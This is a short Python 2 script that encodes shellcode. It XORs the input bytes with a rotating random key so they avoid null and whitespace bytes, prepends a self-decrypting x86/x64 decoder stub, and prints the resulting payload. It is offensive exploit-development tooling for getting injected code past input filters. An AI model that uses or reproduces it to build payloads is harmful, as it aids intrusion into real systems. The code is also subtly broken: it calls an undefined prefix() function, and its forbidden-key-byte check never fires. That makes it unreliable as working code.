import os, sys

def x48(arch):
	return "\x48" if arch == 64 else ""

def encode(sc, rw, arch):
	def ror (w):
		return ((w & (2 ** arch - 1)) >> 1) | (w << (arch - 1) & (2 ** arch - 1))
	xsc = ""
	for c in sc[::-1]:
		xsc = chr(ord(c) ^ (rw & 255)) + xsc
		rw = ror(rw)
	return xsc

def decoder(l, word, arch):
	if l > 0xff:
		from struct import pack;set_ecx = prefix(arch) + "\x31\xc9" + "\x66\xb9" + pack("<H", l)
	else:
		set_ecx = x48(arch) + "\x31\xc9" + "\xb1" + chr(l)
	return set_ecx + x48(arch) + "\xb8" + word + "\xeb\x0c\x5e\x30\x44\x0e\xff" + ("\x48" if arch == 64 else "\x90") + "\xd1\xc8\xe2\xf7\xeb\x05\xe8\xef\xff\xff\xff"

argc = len(sys.argv) - 1
if argc != 1 and argc != 2:
	print "Usage:\n\tpython " + sys.argv[0] + " \\x..\\x... " + "ARCH"
	sys.exit(1)

sc = "".join(c if c != "\\" and c != "x" else "" for c in sys.argv[1]).decode("hex")
l = len(sc)
if (l & 0xff) == 0:
	l += 1
ARCH = int(sys.argv[2])

forbidden_chars = []
for c in [0x00, 0x20, 0xa, 0x9]	:
	if chr(c) in decoder(l, "", ARCH):
		print "xor: Warning, char " + hex(c) + " cannot be avoided since it is present in the prepended decoder"
	else:
		forbidden_chars.append(c)

i = 0
loop = True
while(loop and i < 100000):
	i += 1
	loop = False
	rbs = os.urandom(ARCH / 8)
	rword = 0
	for rb in rbs[::-1]:
		if rb in forbidden_chars:
			loop = True
		rword = rword * 0x100 + ord(rb)
	if not loop:
		xor_sc = encode(sc, rword, ARCH)
		for fc in forbidden_chars:
			if chr(fc) in xor_sc:
				loop = True
if loop:
	print "xor: Failed to satisfy forbidden chars constraint"
	xor_sc = encode(sc, rword, ARCH)
xor_sc = decoder(l, rbs, ARCH) + xor_sc

print "xor-ed with word 0x" + rbs[::-1].encode("hex") + ":"
print "\"" + "".join("\\x" + c.encode("hex") for c in xor_sc) + "\""
print "Total length: " + str(len(xor_sc)) + " bytes."
